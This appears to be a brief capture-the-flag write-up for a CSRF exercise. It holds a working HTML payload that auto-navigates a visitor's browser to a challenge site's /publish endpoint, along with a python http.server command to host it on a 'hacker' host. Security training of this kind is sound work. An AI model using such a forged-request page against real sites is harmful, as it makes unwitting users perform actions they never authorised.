# CSRF 1

Create a html page to serve, which makes the GET request via **top-level navigation**:

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/publish'"></body>
</html>
```

Run in the directory of index.html:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```
